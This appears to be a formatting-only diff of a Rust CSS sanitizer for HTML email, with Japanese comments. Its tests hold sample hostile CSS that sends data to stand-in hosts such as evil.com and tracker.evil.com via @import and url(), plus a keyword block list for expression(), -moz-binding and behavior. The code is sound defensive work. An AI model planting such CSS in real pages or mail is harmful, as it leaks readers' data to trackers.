@@ -47,7 +47,8 @@ pub fn sanitize_css(css: &str) -> CssSanitizeResult {
     // CSS ブロックコメントを除去 (/* ... */ の単純な除去)
     let css = strip_css_comments(css);
 
-    let result: Vec<&str> = css.lines()
+    let result: Vec<&str> = css
+        .lines()
         .filter(|line| {
             let lower = line.to_ascii_lowercase();
             // @import ルールを完全に除去 (mid-line も含む)
@@ -74,7 +75,10 @@ pub fn sanitize_css(css: &str) -> CssSanitizeResult {
     let (sanitized, url_removed) = rewrite_external_urls(&joined);
     removed_count += url_removed;
 
-    CssSanitizeResult { sanitized, removed_count }
+    CssSanitizeResult {
+        sanitized,
+        removed_count,
+    }
 }
 
 /// CSS ブロックコメント (`/* ... */`) を除去する。
@@ -113,7 +117,8 @@ fn strip_css_comments(css: &str) -> String {
 pub fn sanitize_style_attribute(value: &str) -> (String, bool) {
     let lower = value.to_ascii_lowercase();
     // expression() チェック
-    if lower.contains("expression(") || lower.contains("-moz-binding") || lower.contains("behavior") {
+    if lower.contains("expression(") || lower.contains("-moz-binding") || lower.contains("behavior")
+    {
         return (String::new(), true);
     }
     let (rewritten, count) = rewrite_external_urls(value);
@@ -160,12 +165,16 @@ fn rewrite_external_urls(css: &str) -> (String, usize) {
         {
             // "url" に続く '(' を探す (空白可)
             let mut j = i + 3;
-            while j < bytes.len() && bytes[j] == b' ' { j += 1; }
+            while j < bytes.len() && bytes[j] == b' ' {
+                j += 1;
+            }
             if j < bytes.len() && bytes[j] == b'(' {
                 // 括弧内を抽出
                 let start = j + 1;
                 if let Some(end) = css[start..].find(')') {
-                    let inner = css[start..start + end].trim().trim_matches(|c| c == '\'' || c == '"');
+                    let inner = css[start..start + end]
+                        .trim()
+                        .trim_matches(|c| c == '\'' || c == '"');
                     let inner_lower = inner.to_ascii_lowercase();
                     // 外部フェッチを起こし得る参照はすべて中和する (安全性最優先)。
                     // 以前は http:// / https:// のリテラル prefix のみ判定しており、
@@ -205,8 +214,14 @@ mod tests {
     fn import_rule_removed() {
         let css = "@import url('https://evil.com/steal?v=abc');\nbody { color: red; }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("@import"), "@import は除去されるべき");
-        assert!(result.sanitized.contains("color: red"), "無害なルールは保持されるべき");
+        assert!(
+            !result.sanitized.contains("@import"),
+            "@import は除去されるべき"
+        );
+        assert!(
+            result.sanitized.contains("color: red"),
+            "無害なルールは保持されるべき"
+        );
         assert_eq!(result.removed_count, 1);
     }
 
@@ -222,8 +237,14 @@ mod tests {
     fn background_image_external_url_rewritten() {
         let css = "body { background-image: url(https://tracker.evil.com/pixel); }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("tracker.evil.com"), "外部URLは書き換えられるべき");
-        assert!(result.sanitized.contains("about:blank"), "about:blank に置換されるべき");
+        assert!(
+            !result.sanitized.contains("tracker.evil.com"),
+            "外部URLは書き換えられるべき"
+        );
+        assert!(
+            result.sanitized.contains("about:blank"),
+            "about:blank に置換されるべき"
+        );
         assert_eq!(result.removed_count, 1);
     }
 
@@ -231,7 +252,10 @@ mod tests {
     fn data_url_preserved() {
         let css = "body { background-image: url(data:image/png;base64,abc123); }";
         let result = sanitize_css(css);
-        assert!(result.sanitized.contains("data:image/png"), "data: URL は保持されるべき");
+        assert!(
+            result.sanitized.contains("data:image/png"),
+            "data: URL は保持されるべき"
+        );
         assert_eq!(result.removed_count, 0);
     }
 
@@ -239,14 +263,20 @@ mod tests {
     fn expression_removed() {
         let css = "body { width: expression(document.body.scrollWidth); }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("expression("), "expression() は除去されるべき");
+        assert!(
+            !result.sanitized.contains("expression("),
+            "expression() は除去されるべき"
+        );
     }
 
     #[test]
     fn moz_binding_removed() {
         let css = "body { -moz-binding: url('chrome://foo/bar.xml#foo'); }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("-moz-binding"), "-moz-binding は除去されるべき");
+        assert!(
+            !result.sanitized.contains("-moz-binding"),
+            "-moz-binding は除去されるべき"
+        );
     }
 
     #[test]
@@ -271,8 +301,11 @@ mod tests {
         // 以前は素通りしていた。表示時に https で解決され自動フェッチされる。
         let css = "body { background-image: url(//tracker.evil.com/pixel?d=SECRET); }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("tracker.evil.com"),
-            "プロトコル相対 URL が中和されていない: {}", result.sanitized);
+        assert!(
+            !result.sanitized.contains("tracker.evil.com"),
+            "プロトコル相対 URL が中和されていない: {}",
+            result.sanitized
+        );
         assert!(result.sanitized.contains("about:blank"));
         assert_eq!(result.removed_count, 1);
     }
@@ -282,8 +315,11 @@ mod tests {
         // ftp: 等 http(s) 以外のスキームも外部フェッチを起こし得る
         let css = "div { background: url(ftp://evil.com/x); }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("evil.com"),
-            "ftp: スキームが中和されていない: {}", result.sanitized);
+        assert!(
+            !result.sanitized.contains("evil.com"),
+            "ftp: スキームが中和されていない: {}",
+            result.sanitized
+        );
         assert!(result.sanitized.contains("about:blank"));
     }
 
@@ -292,8 +328,11 @@ mod tests {
         // スキームなしの裸ホストも相対解決で外部フェッチになり得る
         let css = "div { background: url(evil.com/track.png); }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("evil.com"),
-            "裸ホスト URL が中和されていない: {}", result.sanitized);
+        assert!(
+            !result.sanitized.contains("evil.com"),
+            "裸ホスト URL が中和されていない: {}",
+            result.sanitized
+        );
         assert!(result.sanitized.contains("about:blank"));
     }
 
@@ -302,12 +341,18 @@ mod tests {
         // メール埋め込み添付 (cid:) と同一文書内フラグメント (#) は保持
         let css1 = "body { background: url(cid:logo123); }";
         let r1 = sanitize_css(css1);
-        assert!(r1.sanitized.contains("cid:logo123"), "cid: は保持されるべき");
+        assert!(
+            r1.sanitized.contains("cid:logo123"),
+            "cid: は保持されるべき"
+        );
         assert_eq!(r1.removed_count, 0);
 
         let css2 = "rect { filter: url(#blur); }";
         let r2 = sanitize_css(css2);
-        assert!(r2.sanitized.contains("url(#blur)"), "フラグメント参照は保持されるべき");
+        assert!(
+            r2.sanitized.contains("url(#blur)"),
+            "フラグメント参照は保持されるべき"
+        );
         assert_eq!(r2.removed_count, 0);
     }
 
@@ -347,8 +392,14 @@ mod tests {
         // コメントの後に @import が来る場合 (コメント除去後に検出される)
         let css = "/* harmless */ @import url('https://evil.com');\nbody { color: red; }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("@import"), "コメント後の @import は除去されるべき");
-        assert!(result.sanitized.contains("color: red"), "無害なルールは保持");
+        assert!(
+            !result.sanitized.contains("@import"),
+            "コメント後の @import は除去されるべき"
+        );
+        assert!(
+            result.sanitized.contains("color: red"),
+            "無害なルールは保持"
+        );
     }
 
     #[test]
@@ -356,7 +407,10 @@ mod tests {
         // コメント内の @import はコメント自体が除去されるので問題なし
         let css = "/* @import url('https://evil.com'); */\nbody { color: blue; }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("evil.com"), "コメント内の URL は除去されるべき");
+        assert!(
+            !result.sanitized.contains("evil.com"),
+            "コメント内の URL は除去されるべき"
+        );
         assert!(result.sanitized.contains("color: blue"));
     }
 
@@ -364,7 +418,10 @@ mod tests {
     fn multiline_comment_stripped() {
         let css = "body {\n  /* remove\n  this */\n  color: red;\n}";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("remove"), "コメントは除去されるべき");
+        assert!(
+            !result.sanitized.contains("remove"),
+            "コメントは除去されるべき"
+        );
         assert!(result.sanitized.contains("color: red"));
     }
 
@@ -373,7 +430,10 @@ mod tests {
         // @font-face も外部 URL を書き換え (直接 src: url() を検出)
         let css = "@font-face { font-family: 'Evil'; src: url(https://evil.com/font.woff); }";
         let result = sanitize_css(css);
-        assert!(!result.sanitized.contains("evil.com"), "@font-face の外部 URL も書き換え");
+        assert!(
+            !result.sanitized.contains("evil.com"),
+            "@font-face の外部 URL も書き換え"
+        );
         assert!(result.sanitized.contains("about:blank"));
     }
 }
